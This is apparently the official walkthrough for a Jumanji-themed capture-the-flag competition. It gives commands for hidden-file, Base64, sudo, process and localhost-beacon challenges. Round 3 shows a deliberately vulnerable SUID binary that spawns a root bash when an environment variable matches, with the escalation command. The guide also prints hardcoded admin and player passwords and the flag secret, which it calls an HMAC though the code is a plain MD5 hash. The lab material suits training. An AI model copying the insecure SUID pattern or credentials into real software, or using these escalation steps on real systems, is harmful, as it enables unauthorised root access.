# TECHNOZION SDC GAMES // OFFICIAL COMPETITION WALKTHROUGH

This document provides a comprehensive, step-by-step guide with every command needed to solve and verify all challenges in **Round 2 (Reconnaissance & Cryptanalysis)** and **Round 3 (Mainframe Core & Privilege Escalation)** for testing and evaluation purposes.

---

## 1. Quick Testing Overview & Score Target

| Round             | Focus Area                   | Checkpoints / Flags                                                        | Max Score           | Completion Trigger                                       |
| :---------------- | :--------------------------- | :------------------------------------------------------------------------- | :------------------ | :------------------------------------------------------- |
| **Round 2** | Jungle Recon & Cryptanalysis | 5 Avatars (`bravestone`, `ruby`, `finbar`, `oberon`, `seaplane`) | **2,950 pts** | Jumanji Victory Video (`jumanji_win.mp4`) & Hub Unlock |
| **Round 3** | Mainframe Core & PrivEsc     | 2 Overrides (`round3_user`, `round3_root`)                             | **2,500 pts** | Mainframe Purge Outro (`round3_win.mp4`) & Auto Logout |
| **Total**   | Full Competition Suite       | **7 Total Challenges**                                               | **5,450 pts** | 100% Platform Completion                                 |

> **Note on Dynamic Flags**: Flags are cryptographically generated per player via MD5 HMAC tied to each player's user ID (`SECRET = 8f7b6c5d4a3e2f1g0h9i8j7k6l5m4n3`). Static/hardcoded flags are strictly rejected. The commands below automatically extract your player's exact dynamic flag directly from the environment.

---

## 2. Testing Credentials & Access

- **Web Platform URL**: `http://127.0.0.1:8080` (or `http://<HOST_IP>:8080`)
- **Default Player Login**:
  - **Username**: `verification_pilot` (or any newly registered player)
  - **Password**: `testpassword123`
- **Admin Portal**:
  - **URL**: `http://127.0.0.1:8080/admin`
  - **Username**: `admin`
  - **Password**: `Admin_ShadowDrop!2026`

---

## 3. Round 2: Jungle Reconnaissance Walkthrough (2,950 Points)

Access **Round 2** by navigating to `/dashboard` from the Expedition Command Center (`/hub`). When you enter each avatar's terminal, a real interactive Linux container shell (`recon_user@sdc-jungle:~$`) is provisioned.

### Hint Utility

At any point in Round 2, you can consult Nigel's reconnaissance parrot:

```bash
parrot_hint 1    # Lore and technical clue for Bravestone
parrot_hint 2    # Lore and technical clue for Ruby Roundhouse
parrot_hint 3    # Lore and technical clue for Mouse Finbar
parrot_hint 4    # Lore and technical clue for Shelly Oberon
parrot_hint 5    # Lore and technical clue for Seaplane McDonough
```

---

### Challenge 2.1: Dr. Smolder Bravestone (400 pts)

* **Theme**: Deep Forest Exploration & Hidden Files
* **Artifact Location**: `/opt/jungle/ruins/.bravestone_relic`
* **Discovery Command**:
  ```bash
  cat /opt/jungle/ruins/.bravestone_relic
  ```
* **Flag Format**: `JUMANJI{bravestone_<8_hex_chars>}`
* **Submission Command**:
  ```bash
  complete $(cat /opt/jungle/ruins/.bravestone_relic)
  ```
* **Expected Output**:
  ```text
  FLAG VERIFIED. +400 POINTS.
  ```

---

### Challenge 2.2: Ruby Roundhouse (600 pts)

* **Theme**: Cryptanalysis & Base64 Dance Moves
* **Artifact Location**: `/home/recon_user/Documents/ruby_dance_moves.txt`
* **Discovery Command**:
  ```bash
  cat /home/recon_user/Documents/ruby_dance_moves.txt | base64 -d
  ```
* **Flag Format**: `JUMANJI{ruby_<8_hex_chars>}`
* **Submission Command**:
  ```bash
  complete $(cat /home/recon_user/Documents/ruby_dance_moves.txt | base64 -d)
  ```
* **Expected Output**:
  ```text
  FLAG VERIFIED. +600 POINTS.
  ```

---

### Challenge 2.3: Franklin "Mouse" Finbar (500 pts)

* **Theme**: Sudo Rule Enumeration & Restricted User Access
* **Artifact Location**: `/home/finbar_admin/flag.txt`
* **Discovery & Verification**:
  Check superuser permissions:

  ```bash
  sudo -l
  ```

  *(Output shows: `(finbar_admin) NOPASSWD: /bin/cat /home/finbar_admin/flag.txt`)*

  Read the sealed flag:

  ```bash
  sudo -u finbar_admin /bin/cat /home/finbar_admin/flag.txt
  ```
* **Flag Format**: `JUMANJI{finbar_<8_hex_chars>}`
* **Submission Command**:

  ```bash
  complete $(sudo -u finbar_admin /bin/cat /home/finbar_admin/flag.txt)
  ```
* **Expected Output**:

  ```text
  FLAG VERIFIED. +500 POINTS.
  ```

---

### Challenge 2.4: Prof. Shelly Oberon (450 pts)

* **Theme**: Active Process Hunting & Process Arguments
* **Discovery Command**:
  Inspect running processes for the cartography daemon:
  ```bash
  ps aux | grep map_generator
  ```
* **Flag Extraction & Submission One-Liner**:
  ```bash
  complete $(ps aux | grep '[m]ap_generator' | awk '{print $NF}')
  ```
* **Expected Output**:
  ```text
  FLAG VERIFIED. +450 POINTS.
  ```

---

### Challenge 2.5: Jefferson "Seaplane" McDonough (1,000 pts)

* **Theme**: Local Network Reconnaissance & Emergency Beacon Service
* **Discovery Commands**:
  Check active listening ports on localhost:

  ```bash
  netstat -tuln
  ```

  *(Output confirms TCP port `8080` is actively listening)*

  Query the internal beacon endpoint:

  ```bash
  curl -s http://127.0.0.1:8080
  ```
* **Submission Command**:

  ```bash
  complete $(curl -s http://127.0.0.1:8080 | grep -o 'JUMANJI{seaplane_[^}]\+}')
  ```
* **Expected Output**:

  ```text
  FLAG VERIFIED. +1000 POINTS.
  ```

---

### Round 2 Completion Verification

Once all 5 challenges are submitted:

- **Total Points Awarded**: `2,950`
- The socket engine dispatches `game-win`, triggering the victory outro cinematic (`/static/assets/jumanji_win.mp4`).

---

## 4. Round 3: Mainframe Core & Privilege Escalation (2,500 Points)

Access **Round 3** by clicking the **ROUND 3: MAINFRAME** card in `/hub` (direct route: `/round3`). An interactive terminal session will connect to `recon_user@sdc-mainframe:~$`.

### Guidance Utility

```bash
nigel_comms
```

Nigel provides dynamic hints tailored to whether you are operating as `recon_user` (database enum) or `root` (privilege escalation).

---

### Challenge 3.1: Mainframe Database Enum // User Override (1,000 pts)

* **Theme**: Configuration File Hunting & SQLite Database Enumeration
* **Artifact Locations**: `/round3/.env` and `/round3/mainframe.db`
* **Discovery Commands**:
  ```bash
  cd /round3
  cat .env
  sqlite3 mainframe.db ".tables"
  sqlite3 mainframe.db "SELECT target, code FROM overrides;"
  ```
* **Extraction & Submission Command**:
  ```bash
  deploy_override $(sqlite3 /round3/mainframe.db "SELECT code FROM overrides WHERE target='admin_access';")
  ```

  *(Alternatively, paste the `OVERRIDE-USER-...` code directly into the **DATABASE OVERRIDE CODE** input box on the Round 3 web HUD)*
* **Expected Output**:
  ```text
  OVERRIDE ACCEPTED. MAINFRAME COMPROMISED. +1000 POINTS.
  ```

---

### Challenge 3.2: SUID Privilege Escalation // Root Override (1,500 pts)

* **Theme**: SUID Binary Analysis, Environment Variable Injection, and Root File Access
* **Artifact Locations**:

  - `/round3/lift_curse` (SUID Root Binary, permissions `4755`)
  - `/round3/lift_curse.c` (C Source Code)
  - `/root/core_override.txt` (Root-owned master override key)
* **Discovery Commands**:
  Find SUID binaries in the system:

  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```

  Inspect source code:

  ```bash
  cat /round3/lift_curse.c
  ```

  *(Code checks: `if (chant && strcmp(chant, "JUMANJI") == 0) { setuid(0); system("/bin/bash -p"); }`)*
* **Privilege Escalation Execution**:
  Run the SUID binary with the required chant:

  ```bash
  CHANT=JUMANJI /round3/lift_curse
  ```

  *(You now have a root prompt: `bash-5.1#` with UID `0`)*
* **Root Flag Extraction & Submission**:
  While inside the root shell:

  ```bash
  cat /root/core_override.txt
  deploy_override $(cat /root/core_override.txt)
  ```

  *(Alternatively, paste the `OVERRIDE-ROOT-...` code into the **SUID ROOT OVERRIDE** input box on the Round 3 web HUD)*
* **Expected Output**:

  ```text
  OVERRIDE ACCEPTED. MAINFRAME COMPROMISED. +1500 POINTS.
  ```

---

### Round 3 Completion Verification

Once both Round 3 overrides are submitted:

- **Round 3 Score**: `2,500 pts`
- **Total Combined Score**: `5,450 pts`
- The socket engine dispatches `game-win-r3`, triggering the final ending sequence (`/static/assets/round3_win.mp4`) and completing the entire CTF.

---

## 5. Automated Verification Suite (Single Command)

To run the complete automated end-to-end regression test suite without manually typing commands, execute the master test runner from the repository root:

```bash
./verify_all.sh
```

### What `./verify_all.sh` Tests (35 Total Checks):

1. **Web Endpoints & OAuth**: Validates `/login`, Google Sign-In redirect, unauthenticated guards for `/hub`, `/dashboard`, and `/round3`.
2. **Round 2 Docker Container**:
   - Boots container with test token and runs `setup_round2.sh`.
   - Tests Bravestone hidden relic extraction.
   - Tests Ruby Base64 decode extraction.
   - Tests Finbar `sudo -u finbar_admin` permission verification.
   - Tests Oberon `ps aux` process table extraction.
   - Tests Seaplane `curl http://127.0.0.1:8080` HTTP beacon extraction.
   - Tests `parrot_hint 1-5`.
   - Verifies scoring of all 5 avatars (+2,950 pts) and duplicate flag rejection.
3. **Round 3 Docker Container**:
   - Boots Round 3 container with test token and runs `setup_round3.sh`.
   - Tests SQLite DB extraction for `OVERRIDE-USER-...` (+1,000 pts).
   - Validates SUID permission `4755` on `/round3/lift_curse`.
   - Tests privilege escalation with `CHANT=JUMANJI` and extracts `OVERRIDE-ROOT-...` (+1,500 pts).
   - Tests `nigel_comms` multi-tier guidance.
   - Verifies duplicate submission rejection.
4. **Admin Lock & Session Integrity**:
   - Locks Round 2 and Round 3 independently via the admin API.
   - Verifies players are cleanly redirected to `/hub` without destroying their sessions.
   - Unlocks both rounds and restores baseline database state.

---

## 6. Python Flag Generation Script (For Test Engineers)

If you need to calculate the exact dynamic flag for any user ID and avatar programmatically without running Docker, you can run this Python snippet:

```python
import hashlib

SECRET = "8f7b6c5d4a3e2f1g0h9i8j7k6l5m4n3"

def get_flag(user_id, avatar_id):
    if avatar_id == 'round3_user':
        digest = hashlib.md5(f"{user_id}:user:{SECRET}".encode()).hexdigest()[:8]
        return f"OVERRIDE-USER-{digest}"
    elif avatar_id == 'round3_root':
        digest = hashlib.md5(f"{user_id}:root:{SECRET}".encode()).hexdigest()[:8]
        return f"OVERRIDE-ROOT-{digest}"
    else:
        digest = hashlib.md5(f"{user_id}:{avatar_id}:{SECRET}".encode()).hexdigest()[:8]
        return f"JUMANJI{{{avatar_id}_{digest}}}"

# Example for User ID 100001:
user_id = 100001
for avatar in ['bravestone', 'ruby', 'finbar', 'oberon', 'seaplane', 'round3_user', 'round3_root']:
    print(f"{avatar:12} -> {get_flag(user_id, avatar)}")
```
